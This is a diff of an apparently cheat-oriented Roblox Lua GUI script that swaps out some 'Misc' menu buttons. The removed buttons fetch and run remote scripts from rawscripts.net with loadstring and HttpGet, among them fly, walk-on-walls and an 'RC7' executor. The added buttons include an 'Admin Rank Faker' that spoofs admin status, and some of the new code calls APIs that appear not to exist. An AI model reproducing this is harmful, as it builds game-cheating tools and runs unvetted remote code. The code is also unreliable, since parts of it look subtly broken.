-	for _, player in ipairs(game.Players:GetPlayers()) do
-		local char = player.Character
-		local root = char and char:FindFirstChild("HumanoidRootPart")
-		local humanoid = char and char:FindFirstChildOfClass("Humanoid")
-
-		if root and humanoid then
-			-- The check will basically never trigger now
-			if root.Position.Y < VOID_HEIGHT then
-				-- fallback teleport (won't ever happen realistically)
-				root.Velocity = Vector3.zero
-				root.CFrame = CFrame.new(root.Position.X, 10, root.Position.Z)
-			end
-		end
-	end
-end)
+-- Admin Rank Faker
+createMiscButton(yPos, "Admin Rank Faker", function()
+    local plr = LocalPlayer
+    if plr then
+        plr:SetAttribute("IsAdmin", true)
+        plr.Name = "[Admin] "..plr.Name
+    end
 end)
 yPos += 40
 
--- walk on wallz
-createMiscButton(yPos, "Walk On Walls", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/FE-walk-on-walls_206"))()
+-- Set FOV
+createMiscButton(yPos, "Set FOV", function()
+    local input = tonumber(LocalPlayer:PromptInput("Enter FOV (default 70)"))
+    if input and input > 0 and input <= 120 then
+        workspace.CurrentCamera.FieldOfView = input
+    else
+        warn("[Misc] Invalid FOV value")
+    end
 end)
 yPos += 40
 
--- CAMERA EEEE
-createMiscButton(yPos, "Security Cameras", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FNAF-Inspired-Camera-Script-17367"))()
+-- Set Max Zoom
+createMiscButton(yPos, "Set Max Zoom", function()
+    local input = tonumber(LocalPlayer:PromptInput("Enter Max Camera Zoom (default 12)"))
+    if input and input > 0 then
+        workspace.CurrentCamera.CameraMaxZoomDistance = input
+    else
+        warn("[Misc] Invalid Zoom value")
+    end
 end)
 yPos += 40
 
--- Local
-createMiscButton(yPos, "RC7", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rc7-29631"))()
+-- Local Time
+createMiscButton(yPos, "Set Local Time", function()
+    local input = LocalPlayer:PromptInput("Enter Time of Day (HH:MM:SS)")
+    if input and tostring(input):match("%d+:%d+:%d+") then
+        game:GetService("Lighting").TimeOfDay = input
+    else
+        warn("[Misc] Invalid Time format")
+    end
 end)
 yPos += 40
 
--- Fly
-createMiscButton(yPos, "Fly GUI v3", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Gui-V3-Turkish-48460"))()
+-- Streamer Mode
+createMiscButton(yPos, "Streamer Mode", function()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+
+    if _G.StreamerMode then
+        for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do
+            if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                if gui:GetAttribute("StreamerOriginalText") then
+                    gui.Text = gui:GetAttribute("StreamerOriginalText")
+                    gui:SetAttribute("StreamerOriginalText", nil)
+                end
+            end
+        end
+        _G.StreamerMode = false
+        print("[Misc] Streamer Mode disabled.")
+    else
+        _G.StreamerMode = true
+        local fakeName = "Player_"..math.random(1000,9999)
+        for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do
+            if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                if gui.Text == LocalPlayer.Name then
+                    gui:SetAttribute("StreamerOriginalText", gui.Text)
+                    gui.Text = fakeName
+                end
+            end
+        end
+        print("[Misc] Streamer Mode enabled. Fake name: "..fakeName)
+    end
 end)
 yPos += 40
 
@@ -1380,4 +1638,3 @@ yPos += 40
 miscLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     scrollMisc.CanvasSize = UDim2.new(0, 0, 0, miscLayout.AbsoluteContentSize.Y)
 end)
-pcall(init)
